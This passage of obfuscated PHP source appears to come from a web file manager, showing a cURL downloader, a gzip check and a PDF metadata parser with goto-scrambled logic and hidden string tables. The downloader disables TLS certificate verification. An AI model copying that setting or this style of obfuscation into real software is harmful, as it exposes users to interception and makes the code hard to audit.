$b¸÷Ûó–Ş)) { usleep(round(rand(0, 1000) * 50)); @unlink($b¸÷Ûó–Ş); $Bê§¢‘Î‰à = @rename($CƒÑ¿©’ö‡, $b¸÷Ûó–Ş); if (!$Bê§¢‘Î‰à) { return array($fµ¤ÏáªÅÕ[1025] => !1, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[1498]); } } return array($fµ¤ÏáªÅÕ[1025] => !0, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[689]); goto Dà©ØÒøÔ¡; aÔöî¦Ğ¢: fclose($AÙ äÌŠ»Š); $FÃ»ƒô  Ú = filesize(iconv_system($CƒÑ¿©’ö‡)); if ($F¬«ë°Ù¯ != 0 && $FÃ»ƒô  Ú != $F¬«ë°Ù¯) { return array($fµ¤ÏáªÅÕ[1025] => !1, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[1497]); } goto B¯ÄõÛœ‡; Dà©ØÒøÔ¡: } else { return array($fµ¤ÏáªÅÕ[1025] => !1, $fµ¤ÏáªÅÕ[1027] => $fµ¤ÏáªÅÕ[1499]); } } static function fileDownloadCurl($Bˆ²¯ª¥˜Î, $eİâù­å¨±, $eô¯‚¯“Ï¶ = false, $F§ÇÅò¿© = 0, $f´•‡İ¤¬Œ = 0) { goto dñÉòÍì‹ƒ; bÔÛÑÄ´…ù: curl_setopt($eì·õ»æÚø, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($eì·õ»æÚø, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($eì·õ»æÚø, CURLOPT_SSL_VERIFYHOST, 0); goto f—Êå¸Ú”; C±‚šçïÑë: if ($b¼Ô¾«Í < $f´•‡İ¤¬Œ && $f´•‡İ¤¬Œ != 0) { return array($EËÍÓÁ‘Ñò[1025] => !1, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[1489]); } if ($b¼Ô¾«Í > $f´•‡İ¤¬Œ && $f´•‡İ¤¬Œ != 0) { return array($EËÍÓÁ‘Ñò[1025] => !1, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[1497]); } if ($eñä‚ù÷Š± && filesize($a˜÷á¼¤) != 0) { self::checkGzip($a˜÷á¼¤); if (!@rename($a˜÷á¼¤, $eİâù­å¨±)) { @unlink($eİâù­å¨±); $eñä‚ù÷Š± = @rename($a˜÷á¼¤, $eİâù­å¨±); if (!$eñä‚ù÷Š±) { return array($EËÍÓÁ‘Ñò[1025] => !1, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[1502]); } } return array($EËÍÓÁ‘Ñò[1025] => !0, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[689]); } goto AĞ†¥“–†İ; Ešøğæä½¸: if ($eô¯‚¯“Ï¶) { curl_setopt($eì·õ»æÚø, CURLOPT_RANGE, $F§ÇÅò¿© . $EËÍÓÁ‘Ñò[707]); } curl_setopt($eì·õ»æÚø, CURLOPT_FILE, $A¥§¥¯»¡‰); curl_setopt($eì·õ»æÚø, CURLOPT_REFERER, get_url_link($Bˆ²¯ª¥˜Î)); goto bÔÛÑÄ´…ù; bÉ£‹Ç¶: $A¥§¥¯»¡‰ = @fopen($a˜÷á¼¤, $EËÍÓÁ‘Ñò[975]); if (!$A¥§¥¯»¡‰) { return array($EËÍÓÁ‘Ñò[1025] => !1, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[1500]); } $eì·õ»æÚø = curl_init($Bˆ²¯ª¥˜Î); goto Ešøğæä½¸; eÄÉéÖ·İ‰: curl_close($eì·õ»æÚø); fclose($A¥§¥¯»¡‰); $b¼Ô¾«Í = filesize(iconv_system($a˜÷á¼¤)); goto C±‚šçïÑë; AĞ†¥“–†İ: return array($EËÍÓÁ‘Ñò[1025] => !1, $EËÍÓÁ‘Ñò[1027] => $EËÍÓÁ‘Ñò[1503]); goto a™ÛáÍÓÃã; F¥¶¯òÌ±ã: curl_setopt($eì·õ»æÚø, CURLOPT_USERAGENT, $EËÍÓÁ‘Ñò[1492]); $eñä‚ù÷Š± = curl_exec($eì·õ»æÚø); curl_progress_end($eì·õ»æÚø); goto eÄÉéÖ·İ‰; dñÉòÍì‹ƒ: $EËÍÓÁ‘Ñò =& $_SERVER[Ö]; $a˜÷á¼¤ = $eİâù­å¨± . $EËÍÓÁ‘Ñò[1488]; set_timeout(); goto bÉ£‹Ç¶; f—Êå¸Ú”: curl_setopt($eì·õ»æÚø, CURLOPT_NOPROGRESS, !1); curl_setopt($eì·õ»æÚø, CURLOPT_PROGRESSFUNCTION, $EËÍÓÁ‘Ñò[1501]); curl_progress_start($eì·õ»æÚø); goto F¥¶¯òÌ±ã; a™ÛáÍÓÃã: } static function checkGzip($dŒÚŒÛŞÂ…) { goto BÇÁÌÎåù; BÇÁÌÎåù: $Cù™—Âç½² = $_SERVER[Ö][1504]; $A”É °†È‘ = file_sub_str($dŒÚŒÛŞÂ…, 0, 2); if ($Cù™—Âç½² != $A”É °†È‘) { return; } goto FÈ±‡ØçËŒ; Cœ‡®®ï¬ª: file_put_contents($dŒÚŒÛŞÂ…, $aœ¦Ù½×–ˆ); goto dëç·æ‹åÓ; FÈ±‡ØçËŒ: ob_start(); readgzfile($dŒÚŒÛŞÂ…); $aœ¦Ù½×–ˆ = ob_get_clean(); goto Cœ‡®®ï¬ª; dëç·æ‹åÓ: } } class FileParsePdf { public static function parse($FâÂÖµÊ) { goto bĞÍŞ¼Œ‚; a±¥¹¨¹Ñ›: if ($D¼”ˆëùŸ) { $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1319]] = $D¼”ˆëùŸ[1]; } $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1513]] = 0; $a­áç«æÂ« = $bèŠÉ¸‡…[1514]; goto f’±ù™Š«ê; añìë…÷‚: if ($C½«ÆŒæ) { $b««Ñ·ÓŞ = $C½«ÆŒæ[$bèŠÉ¸‡…[1508]][$bèŠÉ¸‡…[1177]]; $BĞµÄÁ·ˆ¾ = self::getObjectValue($Aù½öƒ¾ÒØ, $C½«ÆŒæ, $b««Ñ·ÓŞ); } $BĞµÄÁ·ˆ¾ = is_array($BĞµÄÁ·ˆ¾) ? $BĞµÄÁ·ˆ¾ : array(); $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1509]] = 0; goto Eíğ™Œ¦Î»; f¤›ø„£Ò†: $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1506]] = StreamWrapperIO::read($FâÂÖµÊ, 0, $C‘ñÙâ„Ì); $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1507]] = StreamWrapperIO::read($FâÂÖµÊ, $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[77]] - $C‘ñÙâ„Ì, $C‘ñÙâ„Ì); $C½«ÆŒæ = self::decodeXref($Aù½öƒ¾ÒØ); goto añìë…÷‚; EòÎ“³˜ëš: preg_match($a­áç«æÂ«, $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1507]], $D¼”ˆëùŸ); if (!$BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1509]] && count($D¼”ˆëùŸ) == 5) { $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1509]] = $D¼”ˆëùŸ[3]; $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1511]] = $D¼”ˆëùŸ[4]; } preg_match($bèŠÉ¸‡…[1512], $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1506]], $D¼”ˆëùŸ); goto a±¥¹¨¹Ñ›; Eíğ™Œ¦Î»: $a­áç«æÂ« = $bèŠÉ¸‡…[1510]; preg_match($a­áç«æÂ«, $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1506]], $D¼”ˆëùŸ); if (!$BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1509]] && count($D¼”ˆëùŸ) == 5) { $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1509]] = $D¼”ˆëùŸ[3]; $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1511]] = $D¼”ˆëùŸ[4]; } goto EòÎ“³˜ëš; bĞÍŞ¼Œ‚: $bèŠÉ¸‡… =& $_SERVER[Ö]; $C‘ñÙâ„Ì = 32 * 1024; $Aù½öƒ¾ÒØ = array($bèŠÉ¸‡…[776] => fopen($FâÂÖµÊ, $bèŠÉ¸‡…[1155]), $bèŠÉ¸‡…[75] => $FâÂÖµÊ, $bèŠÉ¸‡…[77] => filesize($FâÂÖµÊ), $bèŠÉ¸‡…[1505] => $C‘ñÙâ„Ì); goto f¤›ø„£Ò†; f’±ù™Š«ê: preg_match_all($a­áç«æÂ«, $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1506]], $D¼”ˆëùŸ); if ($D¼”ˆëùŸ[1] && $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1513]] < $D¼”ˆëùŸ[1][0]) { $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1513]] = $D¼”ˆëùŸ[1][0]; } preg_match_all($a­áç«æÂ«, $Aù½öƒ¾ÒØ[$bèŠÉ¸‡…[1507]], $D¼”ˆëùŸ); goto b¬¯Ú”ˆÂ¯; b¬¯Ú”ˆÂ¯: if ($D¼”ˆëùŸ[1] && $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1513]] < $D¼”ˆëùŸ[1][0]) { $BĞµÄÁ·ˆ¾[$bèŠÉ¸‡…[1513]] = $D¼”ˆëùŸ[1][0]; } $BĞµÄÁ·ˆ¾ = self::parseInfoItem($BĞµÄÁ·ˆ¾); return $BĞµÄÁ·ˆ¾; goto Fé¦ÏÂ›£é; Fé¦ÏÂ›£é: } private static function parseInfoItem($aÅ«ßå¦®™) { $C³Ñ¾ßˆƒ¤ =& $_SERVER[Ö]; if (!$aÅ«ßå¦®™) { return !1; } $bÅâ‹†¬ò = array($C³Ñ¾ßˆƒ¤[1320] => array($C³Ñ¾ßˆƒ¤[1515], $C³Ñ¾ßˆƒ¤[33]), $C³Ñ¾ßˆƒ¤[1516] => array($C³Ñ¾ßˆƒ¤[1517], $C³Ñ¾ßˆƒ¤[33]), $C³Ñ¾ßˆƒ¤[183] => array($C³Ñ¾ßˆƒ¤[1518], $C³Ñ¾ßˆƒ¤[206]), $C³Ñ¾ßˆƒ¤[106] => array($C³Ñ¾ßˆƒ¤[1519], $C³Ñ¾ßˆƒ¤[206]), $C³Ñ¾ßˆƒ¤[1513] => array($C³Ñ¾ßˆƒ¤[1513], $C³Ñ¾ßˆƒ¤[272]), $C³Ñ¾ßˆƒ¤[1509] => array($C³Ñ¾ßˆƒ¤[1509], $C³Ñ¾ßˆƒ¤[272]), $C³Ñ¾ßˆƒ¤[1511] => array($C³Ñ¾ßˆƒ¤[1511], $C³Ñ¾ßˆƒ¤[272]), $C³Ñ¾ßˆƒ¤[1520] => array($C³Ñ¾ßˆƒ¤[1521], $C³Ñ¾ßˆƒ¤[33]), $C³Ñ¾ßˆƒ¤[1522] => array($C³Ñ¾ßˆƒ¤[1523], $C³Ñ¾ßˆƒ¤[33]), $C³Ñ¾ßˆƒ¤[1524] => array($C³Ñ¾ßˆƒ¤[1319], $C³Ñ¾ßˆƒ¤[33])); $bˆÇñ©ĞÌ = array(); foreach ($bÅâ‹†¬ò as $F‰ìË¨‡æÛ => $c…µÎ‡†ÔĞ) { if (!isset($aÅ«ßå¦®™[$c…µÎ‡†ÔĞ[0]])) { continue; } $a‚æ§õ¢é = $aÅ«ßå¦®™[$c…µÎ‡†ÔĞ[0]]; if (!$a‚æ§õ¢é || is_array($a‚æ§õ¢é)) { continue; } switch ($c…µÎ‡†ÔĞ[1]) { case $C³Ñ¾ßˆƒ¤[272]: $a‚æ§õ¢é = intval($a‚æ§õ¢é); break; case $C³Ñ¾ßˆƒ¤[206]: if (substr($a‚æ§õ¢é, 0, 2) == $C³Ñ¾ßˆƒ¤[1525]) { $a‚æ§õ¢é = substr($a‚æ§õ¢é, 2, 14); } if (strtotime($a‚æ§õ¢é)) { $a‚æ§õ¢é = date($C³Ñ¾ßˆƒ¤[1526], strtotime($a‚æ§õ¢é)); } break; } $bˆÇñ©ĞÌ[$F‰ìË¨‡æÛ] = $a‚æ§õ¢é; } return $bˆÇñ©ĞÌ; } private static function decodeXref(&$cËæ£ôš¡á) { goto aê‘³èÌŠ; d‡íĞ•š£: if (preg_match($Dº¥§Ö£æ‰[1541], $Eåç–ğáà’, $D¢À˜öœ) > 0) { } return $eŠ¾Ó®ŸâÖ; goto eòçÛæ…óš; D¦Âì°×Ñå: if ($cËæ£ôš¡á[$Dº¥§Ö£æ‰[77]] - $a¯ËÄ–»² > $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1505]]) { $f±œ²øÊ˜¸ = 4 * $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1505]]; $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1505]] = $f±œ²øÊ˜¸; $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1506]] = StreamWrapperIO::read($cËæ£ôš¡á[$Dº¥§Ö£æ‰[75]], 0, $f±œ²øÊ˜¸); $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1507]] = StreamWrapperIO::read($cËæ£ôš¡á[$Dº¥§Ö£æ‰[75]], $cËæ£ôš¡á[$Dº¥§Ö£æ‰[77]] - $f±œ²øÊ˜¸, $f±œ²øÊ˜¸); $f³µ¬‹Ş«Ê = $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1507]]; } $fäèœ¢İò = 0; preg_match_all($Dº¥§Ö£æ‰[1529], $f³µ¬‹Ş«Ê, $D¢À˜öœ); goto fºÙö¬ô; eºôè‚‘‡: $BÀ†©šßÊ = $Dº¥§Ö£æ‰[1528]; if (!preg_match_all($BÀ†©šßÊ, $f³µ¬‹Ş«Ê, $D¢À˜öœ, PREG_SET_ORDER, 0)) { return !1; } $a¯ËÄ–»² = intval($D¢À˜öœ[0][1]); goto D¦Âì°×Ñå; BİîÎ±„à: if (preg_match($Dº¥§Ö£æ‰[1534], $Eåç–ğáà’, $D¢À˜öœ) > 0) { $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[77]] = intval($D¢À˜öœ[1]); } if (preg_match($Dº¥§Ö£æ‰[1535], $Eåç–ğáà’, $D¢À˜öœ) > 0) { $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[1536]] = intval($D¢À˜öœ[1]) . $Dº¥§Ö£æ‰[70] . intval($D¢À˜öœ[2]); } if (preg_match($Dº¥§Ö£æ‰[1537], $Eåç–ğáà’, $D¢À˜öœ) > 0) { $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[1538]] = intval($D¢À˜öœ[1]) . $Dº¥§Ö£æ‰[70] . intval($D¢À˜öœ[2]); } goto Dè¢§£“‘ƒ; aê‘³èÌŠ: $Dº¥§Ö£æ‰ =& $_SERVER[Ö]; $f³µ¬‹Ş«Ê = $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1507]]; $eŠ¾Ó®ŸâÖ = array($Dº¥§Ö£æ‰[1508] => array(), $Dº¥§Ö£æ‰[1527] => array()); goto eºôè‚‘‡; fºÙö¬ô: foreach ($D¢À˜öœ[3] as $f¬÷Ò¦¯·İ => $e‚£Ö‘ƒæ†) { if ($D¢À˜öœ[3][$f¬÷Ò¦¯·İ] == $Dº¥§Ö£æ‰[1530]) { $dçæŸ˜Öå = $fäèœ¢İò . $Dº¥§Ö£æ‰[70] . intval($D¢À˜öœ[2][$f¬÷Ò¦¯·İ]); $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1527]][$dçæŸ˜Öå] = intval($D¢À˜öœ[1][$f¬÷Ò¦¯·İ]); ++$fäèœ¢İò; } else { if ($D¢À˜öœ[3][$f¬÷Ò¦¯·İ] == $Dº¥§Ö£æ‰[1531]) { ++$fäèœ¢İò; } else { } } } if (preg_match_all($Dº¥§Ö£æ‰[1532], $f³µ¬‹Ş«Ê, $D¢À˜öœ)) { $AÊøè¯ÂÎ = $cËæ£ôš¡á[$Dº¥§Ö£æ‰[77]] - $cËæ£ôš¡á[$Dº¥§Ö£æ‰[1505]]; foreach ($D¢À˜öœ[0] as $f¬÷Ò¦¯·İ => $cŒ‡È½Æç) { $EØ¦°¼É¨ = $D¢À˜öœ[1][$f¬÷Ò¦¯·İ] . $Dº¥§Ö£æ‰[70] . $D¢À˜öœ[2][$f¬÷Ò¦¯·İ]; $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1527]][$EØ¦°¼É¨] = strpos($f³µ¬‹Ş«Ê, $cŒ‡È½Æç) + $AÊøè¯ÂÎ + 1; } } if (preg_match_all($Dº¥§Ö£æ‰[1533], $f³µ¬‹Ş«Ê, $D¢À˜öœ)) { $Eåç–ğáà’ = count($D¢À˜öœ[1]) == 1 ? $D¢À˜öœ[1][0] : $D¢À˜öœ[1][1]; } else { $Eåç–ğáà’ = substr($f³µ¬‹Ş«Ê, -1024 * 5); } goto BİîÎ±„à; Dè¢§£“‘ƒ: if (preg_match($Dº¥§Ö£æ‰[1539], $Eåç–ğáà’, $D¢À˜öœ) > 0) { $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[1177]] = intval($D¢À˜öœ[1]) . $Dº¥§Ö£æ‰[70] . intval($D¢À˜öœ[2]); } if (preg_match($Dº¥§Ö£æ‰[1540], $Eåç–ğáà’, $D¢À˜öœ) > 0) { $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[363]] = array(); $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[363]][0] = $D¢À˜öœ[1]; $eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[363]][1] = $D¢À˜öœ[2]; } if (!$eŠ¾Ó®ŸâÖ[$Dº¥§Ö£æ‰[1508]][$Dº¥§Ö£æ‰[1177]]) { return !1; } goto d‡íĞ•š£; eòçÛæ…óš: } private static function getObjectValue($CÄ¯Ú¼Æ¨À, $AùÖÅÅ‹‰Ü, $dŞÈôŠ˜ÊÊ) { goto A¦‚»µ‹­ª; A¦‚»µ‹­ª: $F­ˆá¸š¾ =& $_SERVER[Ö]; $cÆèí¨ë×“ = self::getObject($CÄ¯Ú¼Æ¨À, $AùÖÅÅ‹‰Ü[$F­ˆá¸š¾[1527]][$dŞÈôŠ˜ÊÊ]); if (is_string($cÆèí¨ë×“[1])) { return $cÆèí¨ë×“[1]; } goto b¡õã™ÎŞÇ; b¡õã™ÎŞÇ: if (!is_array($cÆèí¨ë×“[1])) { return array(); } $fÃ×øİ¼ã = array(); for ($Fäò“ß÷“è = 0; $Fäò“ß÷“è < count($cÆèí¨ë×“[1]); $Fäò“ß÷“è += 2) { $b‹á«¹§ƒ = $cÆèí¨ë×“[1][$Fäò“ß÷“è]; $cñ”™Ùëê = $cÆèí¨ë×“[1][$Fäò“ß÷“è + 1]; if (count($b‹á«¹§ƒ) == 3 && $b‹á«¹§ƒ[0] == $F­ˆá¸š¾[8]) { $D•¿áõêˆ = !1; if ($cñ”™Ùëê[0] == $F­ˆá¸š¾[1542]) { $cñ”™Ùëê = self::getObject($CÄ¯Ú¼Æ¨À, $AùÖÅÅ‹‰Ü[$F­ˆá¸š¾[1527]][$cñ”™Ùëê[1]]); } $D•¿áõêˆ = $cñ”™Ùëê[1]; if ($D•¿áõêˆ === !1) { continue; } if (is_string($D•¿áõêˆ)) { $D•¿áõêˆ = self::decodeStr($D•¿áõêˆ); } $fÃ×øİ¼ã[$b‹á«¹§ƒ[1]] = $D•¿áõêˆ; } } goto FèĞÕÔØ°Á; FèĞÕÔØ°Á: return $fÃ×øİ¼ã; goto D¶‚İ·ß‡; D¶‚İ·ß‡: } private static function getObject($c‡í˜øùšâ, $cºãˆ¡¹) { $eåØ‘‚ÏÚñ = self::getObjectItem($c‡í˜øùšâ, $cºãˆ¡¹); $eåØ‘‚ÏÚñ = self::getObjectItem($c‡í˜øùšâ, $eåØ‘‚ÏÚñ[2]); return $eåØ‘‚ÏÚñ; } private static function getObjectItem($AË½ß¯ëë¤, $d‚ÅğôãÆĞ) { goto D†Õ £î; FĞŠ¾”ÎÜÚ: $Cù×¥¤£ï = self::getRawObject($eàáŞÙ†, $eÕ¢ «„ÔÛ); if ($d‚ÅğôãÆĞ >= $B·„¶¹”ˆÉ) { $Cù×¥¤£ï[2] = $Cù×¥¤£ï[2] + $B·„¶¹”ˆÉ; } else { if ($d‚ÅğôãÆĞ > $F£§š•æ„ && $d‚ÅğôãÆĞ <= $B·„¶¹”ˆÉ) { $Cù×¥¤£ï[2] = $Cù×¥¤£ï[2] + $d‚ÅğôãÆĞ; } } return $Cù×¥¤£ï; goto D´ ğä‡ê¦; Aˆ´ø•Óí—: $eÕ¢ «„ÔÛ = $d‚ÅğôãÆĞ >= $B·„¶¹”ˆÉ ? $d‚ÅğôãÆĞ - $B·„¶¹”ˆÉ : $d‚ÅğôãÆĞ; $eàáŞÙ† = $d‚ÅğôãÆĞ >= $B·„¶¹”ˆÉ ? $AË½ß¯ëë¤[$dÃÒÙ÷Ä“[1507]] : $AË½ß¯ëë¤[$dÃÒÙ÷Ä“[1506]]; if ($d‚ÅğôãÆĞ > $F£§š•æ„ && $d‚ÅğôãÆĞ <= $B·„¶¹”ˆÉ) { $eÕ¢ «„ÔÛ = 0; $eàáŞÙ† = StreamWrapperIO::read($AË½ß¯ëë¤[$dÃÒÙ÷Ä“[75]], $d‚ÅğôãÆĞ, $F£§š•æ„); } goto FĞŠ¾”ÎÜÚ; D†Õ £î: $dÃÒÙ÷Ä“ =& $_SERVER[Ö]; $F£§š•æ„ = $AË½ß¯ëë¤[$dÃÒÙ÷Ä“[1505]]; $B·„¶¹”ˆÉ = $AË½ß¯ëë¤[$dÃÒÙ÷Ä“[77]] - $F£§š•æ„; goto Aˆ´ø•Óí—; D´ ğä‡ê¦: } private static function decodeStr($bÅ²‹Œ²) { goto EÌŠÁôóªª; a¼Ã’Ë¤Üğ: $bÅ²‹Œ² = $BÕºìô­À¸[33]; foreach ($FÜÌÉ‰¾Ê as $Aööéİ¨ÃŒ) { if (preg_match($BÕºìô­À¸[1554], $Aööéİ¨ÃŒ)) { $bÅ²‹Œ² .= \chr(hexdec(trim($Aööéİ¨ÃŒ, $BÕºìô­À¸[1555]))); } else { $bÅ²‹Œ² .= $Aööéİ¨ÃŒ; } } $FÜÌÉ‰¾Ê = preg_split($BÕºìô­À¸[1556], $bÅ²‹Œ², -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CèŸÙï¯ß‘; CèŸÙï¯ß‘: $bÅ²‹Œ² = $BÕºìô­À¸[33]; foreach ($FÜÌÉ‰¾Ê as $Aööéİ¨ÃŒ) { if (preg_match($BÕºìô­À¸[1557], $Aööéİ¨ÃŒ) && !1 === stripos($Aööéİ¨ÃŒ, $BÕºìô­À¸[1558])) { $Aööéİ¨ÃŒ = preg_replace($BÕºìô­À¸[1559], $BÕºìô­À¸[33], $Aööéİ¨ÃŒ); $Aööéİ¨ÃŒ = trim($Aööéİ¨ÃŒ, $BÕºìô­À¸[921]); $Aööéİ¨ÃŒ = pack($BÕºìô­À¸[1560], $Aööéİ¨ÃŒ); $bÅ²‹Œ² .= $Aööéİ¨ÃŒ; } else { $bÅ²‹Œ² .= $Aööéİ¨ÃŒ; } } if (preg_match($BÕºìô­À¸[1561], $bÅ²‹Œ²)) { $C¨ğà†á = substr($bÅ²‹Œ², 2); $bÅ²‹Œ² = $BÕºìô­À¸[33]; $aå È‹«‰ = strlen($C¨ğà†á); for ($d´ŒğÂ­œ = 0; $d´ŒğÂ­œ < $aå È‹«‰; $d´ŒğÂ­œ += 2) { $fŸŸŠÑÈĞ¼ = hexdec(bin2hex(substr($C¨ğà†á, $d´ŒğÂ­œ, 2))); $bÅ²‹Œ² .= mb_convert_encoding($BÕºìô­À¸[1562] . intval($fŸŸŠÑÈĞ¼) . $BÕºìô­À¸[67], $BÕºìô­À¸[1563], $BÕºìô­À¸[1564]); } } goto eµòòÙƒ¦ ; EÌŠÁôóªª: $BÕºìô­À¸ =& $_SERVER[Ö]; $bÅ²‹Œ² = str_replace(array($BÕºìô­À¸[1543], $BÕºìô­À¸[1544], $BÕºìô­À¸[1545], $BÕºìô­À¸[1546], $BÕºìô­À¸[1547], $BÕºìô­À¸[1548], $BÕºìô­À¸[1549], $BÕºìô­À¸[1550]), array($BÕºìô­À¸[93], $BÕºìô­À¸[50], $BÕºìô­À¸[8], $BÕºìô­À¸[244], $BÕºìô­À¸[812], $BÕºìô­À¸[213], $BÕºìô­À¸[985], $BÕºìô­À¸[326]), $bÅ²‹Œ²); $FÜÌÉ‰¾Ê = preg_split($BÕºìô­À¸[1551], $bÅ²‹Œ², -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Fâ±ãÉ«‹î; eµòòÙƒ¦ : return $bÅ²‹Œ²; goto dø»‹‹¹é ; Fâ±ãÉ«‹î: $bÅ²‹Œ² = $BÕºìô­À¸[33]; foreach ($FÜÌÉ‰¾Ê as $Aööéİ¨ÃŒ) { if (preg_match($BÕºìô­À¸[1552], $Aööéİ¨ÃŒ)) { $bÅ²‹Œ² .= \chr(octdec(trim($Aööéİ¨ÃŒ, $BÕºìô­À¸[93]))); } else { $bÅ²‹Œ² .= $Aööéİ¨ÃŒ; } } $FÜÌÉ‰¾Ê = preg_split($BÕºìô­À¸[1553], $bÅ²‹Œ², -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto a¼Ã’Ë¤Üğ; dø»‹‹¹é : } private static function getRawObject($BµáŠ§çƒº, $E¤‚Ù‹»¹õ = 0) { goto bà‘ÃİõœÌ; bà‘ÃİõœÌ: $Dâó¿…Å‰˜ =& $_SERVER[Ö]; $Aêé²¦íÖ« = $Dâó¿…Å‰˜[33]; $b˜ÏæÎí­‡ = $Dâó¿…Å‰˜[33]; goto Eô»íä–¾; Eô»íä–¾: $E¤‚Ù‹»¹õ += strspn($BµáŠ§çƒº, $Dâó¿…Å‰˜[1565], $E¤‚Ù‹»¹õ); $CÜô…èêÍ = $BµáŠ§çƒº[$E¤‚Ù‹»¹õ]; switch ($CÜô…èêÍ) { case $Dâó¿…Å‰˜[1566]: $c„†¿‡Ï—ß = strcspn($BµáŠ§çƒº, $Dâó¿…Å‰˜[1567], $E¤‚Ù‹»¹õ); if ($c„†¿‡Ï—ß > 0) { $E¤‚Ù‹»¹õ += $c„†¿‡Ï—ß; return self::getRawObject($BµáŠ§çƒº, $E¤‚Ù‹»¹õ); } break; case $Dâó¿…Å‰˜[8]: $Aêé²¦íÖ« = $CÜô…èêÍ; ++$E¤‚Ù‹»¹õ; $DÃ„ÆµÃ– = preg_match($Dâó¿…Å‰˜[1568], substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 256), $E•Ëéğ¢‰); if (1 == $DÃ„ÆµÃ–) { $b˜ÏæÎí­‡ = $E•Ëéğ¢‰[1]; $E¤‚Ù‹»¹õ += strlen($b˜ÏæÎí­‡); } break; case $Dâó¿…Å‰˜[244]: case $Dâó¿…Å‰˜[812]: $Aêé²¦íÖ« = $CÜô…èêÍ; ++$E¤‚Ù‹»¹õ; $B÷¸ÔÉ­Ò = $E¤‚Ù‹»¹õ; if ($Dâó¿…Å‰˜[244] == $CÜô…èêÍ) { $dß¶—Á‚Äï = 1; while ($dß¶—Á‚Äï > 0) { if (!isset($BµáŠ§çƒº[$B÷¸ÔÉ­Ò])) { break; } $a–ô˜¬¶Ê™ = $BµáŠ§çƒº[$B÷¸ÔÉ­Ò]; switch ($a–ô˜¬¶Ê™) { case $Dâó¿…Å‰˜[93]: ++$B÷¸ÔÉ­Ò; break; case $Dâó¿…Å‰˜[244]: ++$dß¶—Á‚Äï; break; case $Dâó¿…Å‰˜[812]: --$dß¶—Á‚Äï; break; } ++$B÷¸ÔÉ­Ò; } $b˜ÏæÎí­‡ = substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, $B÷¸ÔÉ­Ò - $E¤‚Ù‹»¹õ - 1); $E¤‚Ù‹»¹õ = $B÷¸ÔÉ­Ò; } break; case $Dâó¿…Å‰˜[153]: case $Dâó¿…Å‰˜[472]: $Aêé²¦íÖ« = $CÜô…èêÍ; ++$E¤‚Ù‹»¹õ; if ($Dâó¿…Å‰˜[153] == $CÜô…èêÍ) { $b˜ÏæÎí­‡ = array(); do { $cáö›ğÜ¶Î = $E¤‚Ù‹»¹õ; $F„ÛÚŞÂÚ = self::getRawObject($BµáŠ§çƒº, $E¤‚Ù‹»¹õ); $E¤‚Ù‹»¹õ = $F„ÛÚŞÂÚ[2]; $b˜ÏæÎí­‡[] = $F„ÛÚŞÂÚ; } while ($Dâó¿…Å‰˜[472] != $F„ÛÚŞÂÚ[0] && $E¤‚Ù‹»¹õ != $cáö›ğÜ¶Î); array_pop($b˜ÏæÎí­‡); } break; case $Dâó¿…Å‰˜[920]: case $Dâó¿…Å‰˜[923]: if (isset($BµáŠ§çƒº[$E¤‚Ù‹»¹õ + 1]) && $BµáŠ§çƒº[$E¤‚Ù‹»¹õ + 1] == $CÜô…èêÍ) { $Aêé²¦íÖ« = $CÜô…èêÍ . $CÜô…èêÍ; $E¤‚Ù‹»¹õ += 2; if 